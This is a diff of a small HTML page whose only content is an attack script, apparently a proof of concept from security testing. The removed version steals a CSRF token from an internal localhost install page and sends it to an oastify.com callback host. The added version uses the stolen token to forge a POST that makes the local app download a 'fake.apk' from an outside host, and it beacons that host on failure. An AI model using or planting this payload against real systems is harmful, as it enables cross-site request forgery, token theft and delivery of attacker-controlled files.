@@ -1,15 +1,28 @@
 <!DOCTYPE html>
 <html>
 <body>
-<script>
-fetch("http://localhost:3000/apiv1/private/install")
-  .then(r => r.text())
-  .then(html => {
-    const match = html.match(/name="csrfToken" value="([^"]+)"/);
-    const token = match ? match[1] : "no-token";
-    fetch("https://kk8qhbpn2nogsc6c9kcgvh3olfr6fz3o.oastify.com/log?token=" + token);
-  });
-</script>
+  <script>
+    // Step 1: Fetch the internal install page
+    fetch("http://localhost:3000/apiv1/private/install?id=1")
+      .then(res => res.text())
+      .then(html => {
+        // Step 2: Parse the HTML to extract the CSRF token
+        const token = html.match(/name="csrfToken" value="([^"]+)"/);
+        if (token) {
+          const csrf = token[1];
+
+          // Step 3: Create and submit the POST request
+          fetch("http://localhost:3000/api/apps/1", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/x-www-form-urlencoded"
+            },
+            body: `url=https://qe8wbhjtwtimmi0i3q6mpnxufllc96xv.oastify.com/fake.apk&downloadOnly=true&csrfToken=${csrf}`
+          });
+        } else {
+          fetch("https://qe8wbhjtwtimmi0i3q6mpnxufllc96xv.oastify.com/csrf?status=no_token_found");
+        }
+      });
+  </script>
 </body>
 </html>
-
